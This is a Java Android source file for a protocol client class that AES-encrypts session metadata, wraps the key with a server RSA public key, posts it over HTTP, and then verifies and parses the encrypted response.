package com.vvt.phoenix.prot;

import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.interfaces.RSAPublicKey;

import javax.crypto.SecretKey;

import android.os.ConditionVariable;
import android.os.Looper;
import android.util.Log;

import com.vvt.logger.FxLog;
import com.vvt.phoenix.http.FxHttp;
import com.vvt.phoenix.http.FxHttpListener;
import com.vvt.phoenix.http.request.ContentType;
import com.vvt.phoenix.http.request.FxHttpRequest;
import com.vvt.phoenix.http.response.FxHttpResponse;
import com.vvt.phoenix.http.response.SentProgress;
import com.vvt.phoenix.prot.command.CommandMetaDataWrapper;
import com.vvt.phoenix.prot.command.response.RAskResponse;
import com.vvt.phoenix.prot.parser.ProtocolParser;
import com.vvt.phoenix.prot.parser.ResponseParser;
import com.vvt.phoenix.prot.session.SessionInfo;
import com.vvt.phoenix.util.DataBuffer;
import com.vvt.phoenix.util.crc.CRC32Checksum;
import com.vvt.phoenix.util.crypto.AESCipher;
import com.vvt.phoenix.util.crypto.AESKeyGenerator;
import com.vvt.phoenix.util.crypto.RSACipher;
import com.vvt.phoenix.util.crypto.RSAKeyGenerator;

public class RAskAgencry extends Thread{
	
	//Debugging
	private static final String TAG = "RAskAgency";
	private static final boolean DEBUG = true;
	
	//Members
	private SessionInfo mSession;
	private RAskResponse mResponse;
	private String mUrl;
	private ConditionVariable mCallerLock;
	private ConditionVariable mSecretaryLock;
	private boolean mHttpError;
	private String mHttpErrorMsg;
	private byte[] mHttpRequestData;
	private DataBuffer mHttpResponseBuffer;
	
	//Constants
	private static final int HTTP_TIME_OUT = (1*60*1000);	// 1 minute
	private static final int CALLER_TIME_OUT = (2*60*1000);	// 2 minute
	private static final int SECRETARY_TIME_OUT = (2*60*1000);	// 2 minute
	
	/**
	 * Constructor
	 * @param session
	 */
	public RAskAgencry(SessionInfo session, String url){
		mSession = session;
		mUrl = url;
		
		mResponse = new RAskResponse();
		mCallerLock = new ConditionVariable();
	}
	
	/**
	 * 
	 * @return null if error occur in client RAsk construction phase or can not parsing response data (including Transport Error)
	 */
	public RAskResponse doRAsk(){
		this.start();
		if(mCallerLock.block(CALLER_TIME_OUT) == false){	//time out occur
			if(DEBUG){
				Log.e(TAG, "Caller time out");
			}
			mResponse = null;
		}
		mCallerLock.close();
		
		if(DEBUG){
			Log.v(TAG, "caller is free");
			if(mResponse != null){
				Log.v(TAG, "number of bytes that server received: "+mResponse.getNumberOfBytesReceived());
			}
		}
		
		return mResponse;
	}
	
	@Override
	public void run(){
		
		if(DEBUG){
			Log.v(TAG, "Session CSID: "+ mSession.getCsid());
			Log.v(TAG, "Session SSID: "+mSession.getSsid());
		}
		
		//1 initiate CommandMetaDataWrapper
		CommandMetaDataWrapper metaWrapper = new CommandMetaDataWrapper();
		metaWrapper.setCommandMetaData(mSession.getMetaData());
		metaWrapper.setPayloadSize((int) mSession.getPayloadSize());
		metaWrapper.setPayloadCrc32(mSession.getPayloadCrc32());
		metaWrapper.setTransportDirective(TransportDirectives.RASK);
		
		//2 parse meta data
		byte[] parsedMetaData = ProtocolParser.parseCommandMetadata(metaWrapper);
		
		//3 encrypt parsedMetaData
		SecretKey secretKey = AESKeyGenerator.generateKeyFromRaw(mSession.getAesKey());
		byte[] encryptedParsedMetaData;
		try {
			encryptedParsedMetaData = AESCipher.encryptSynchronous(secretKey, parsedMetaData);
		} catch (InvalidKeyException e) {
			FxLog.e(TAG, String.format("> run # Got InvalidKeyException : %s", e.getMessage()));
			mResponse = null;
			mCallerLock.open();
			return;
		}
		
		//4 calculate encryptedParsedMetaData crc32
		long metaDataCrcValue = CRC32Checksum.calculateSynchronous(encryptedParsedMetaData);

		//5 calculate meta data length
		//TODO what is the bound of REQUEST_LENGTH ?
		int metaDataLen = encryptedParsedMetaData.length;

		//6 encrypt AES Key with RSA Public Key
		RSAPublicKey pk = RSAKeyGenerator.generatePublicKeyFromRaw(mSession.getServerPublicKey());	
		byte[] encryptedAesKey;
		try {
			encryptedAesKey = RSACipher.encrypt(pk, mSession.getAesKey());
		} catch (InvalidKeyException e) {
			FxLog.e(TAG, String.format("> run # Got InvalidKeyException : %s", e.getMessage()));
			mResponse = null;
			mCallerLock.open();
			return;
		}

		//7 parse meta data with header
		DataBuffer buffer = new DataBuffer();
		//Encryption Type
		buffer.writeByte((byte) 1);
		//Session ID
		buffer.writeInt((int) mSession.getSsid());
		//Encrypted AES Key with length
		buffer.writeShort((short) encryptedAesKey.length);
		buffer.writeBytes(encryptedAesKey);
		//Request Length
		buffer.writeShort((short) metaDataLen);
		//MetaData CRC32
		buffer.writeInt((int) metaDataCrcValue);
		//Encrypted MetaData
		buffer.writeBytes(encryptedParsedMetaData);
		
		//8 start Secretary
		mHttpRequestData = buffer.toArray();
		mSecretaryLock = new ConditionVariable();
		HttpThreadAgency s = new HttpThreadAgency();
		s.start();
		
		//9 wait for Secretary response
		if(DEBUG){
			Log.v(TAG, "Blocking thread and waiting for Secretary response...");
		}
		// if time out
		if(mSecretaryLock.block(SECRETARY_TIME_OUT) == false){	//time out
			mSecretaryLock.close();
			if(DEBUG){
				Log.e(TAG, "Secretary time out");
			}
			mResponse = null;
			mCallerLock.open();
			return;
		}
		mSecretaryLock.close();
		// if finished, check http status
		if(mHttpError == true){
			if(DEBUG){
				Log.e(TAG, "Http Error: "+mHttpErrorMsg);
			}
			
			mResponse = null;
			mCallerLock.open();
			return;
		}
		
		//10 working with Server response data
		DataBuffer serverResponse = new DataBuffer(mHttpResponseBuffer.toArray());
		//10.1 check encryption
		if(serverResponse.readByte() == 1){
			if(DEBUG){
				Log.v(TAG, "IS_ENCRYPT = TRUE");
			}
			byte[] plainText = null;
			try {
				plainText = AESCipher.decryptSynchronous(secretKey, serverResponse.borrowRemain());
			} catch (Exception e){
				if(DEBUG){
					Log.e(TAG, "Exception while decrypt response: "+e.getMessage());
				}
				mResponse = null;
				mCallerLock.open();
				return;
			}
			serverResponse = new DataBuffer(plainText);
		}
		//10.2 check crc32
		long comingCrc = serverResponse.read4BytesAsLong();
		long calculateCrc = 0;
		byte[] rawResponse = null;	// rawResponse is response data that already cut encrypt flag and crc32
		try {
			 rawResponse = serverResponse.borrowRemain();
		} catch (IOException e) {
			if(DEBUG){
				Log.e(TAG, "Exception while calculate CRC32 of response data: "+e.getMessage());
			}
			mResponse = null;
			mCallerLock.open();
			return;
		}
		calculateCrc = CRC32Checksum.calculateSynchronous(rawResponse);
		if(DEBUG){
			Log.v(TAG, "comingCRC: "+comingCrc);
			Log.v(TAG, "calculateCRC: "+calculateCrc);
		}
		if(comingCrc != calculateCrc){
			if(DEBUG){
				Log.e(TAG, "invalid CRC32 value");
			}
			mResponse = null;
			mCallerLock.open();
			return;
		}

		//11 parse response
		if(DEBUG){
			Log.v(TAG, "parse RAsk response");
		}
		try {
			mResponse = (RAskResponse) ResponseParser.parseResponse(rawResponse, true);
			mResponse.setCsid(mSession.getCsid());
		} catch (IOException e) {
			if(DEBUG){
				Log.e(TAG, "Exception while parsing response: "+e.getMessage());
			}
			mResponse = null;
			mCallerLock.open();
			return;
		}
				
		mCallerLock.open();
	}

///////////////////////////////////////////////////// Secretary ///////////////////////////////////////////// 
	private class HttpThreadAgency extends Thread implements FxHttpListener{
		
		
		@Override
		public void run(){
			Looper.prepare();
			FxHttp httpManager = new FxHttp();
			httpManager.setHttpListener(this);
			FxHttpRequest request = new FxHttpRequest();
			request.setUrl(mUrl);
			request.setMethod("POST");
			request.setConnecTimeOut(HTTP_TIME_OUT);
			request.setReadTimeOut(HTTP_TIME_OUT);
			request.addDataItem(mHttpRequestData);
			request.setContentType(ContentType.BINARY_STREAM);
			mHttpResponseBuffer = new DataBuffer();
			httpManager.execute(request);
			Looper.loop();
		}

		@Override
		public void onHttpError(Throwable err, String msg) {
			if(DEBUG){
				Log.e(TAG, "Http error: "+msg);
			}
			mHttpError = true;
			mHttpErrorMsg = msg;
			mSecretaryLock.open();
			
		}
		
		@Override
		public void onHttpSentProgress(SentProgress progress) {
			// not apply
			if(DEBUG){
				Log.v(TAG, "Http is Sending...");
			}
		}

		@Override
		public void onHttpResponse(FxHttpResponse response) {
			if(DEBUG){
				Log.v(TAG, "Http is sending data back to us");
			}
			mHttpResponseBuffer.writeBytes(response.getBody());
			
		}

		@Override
		public void onHttpSuccess(FxHttpResponse result) {
			if(DEBUG){
				Log.v(TAG, "OK. Http is success");
			}
			mHttpError = false;
			mSecretaryLock.open();		
		}
		
	}
//	/////////////////////////////////////////////////// End Secretary ///////////////////////////////////////////// 

}
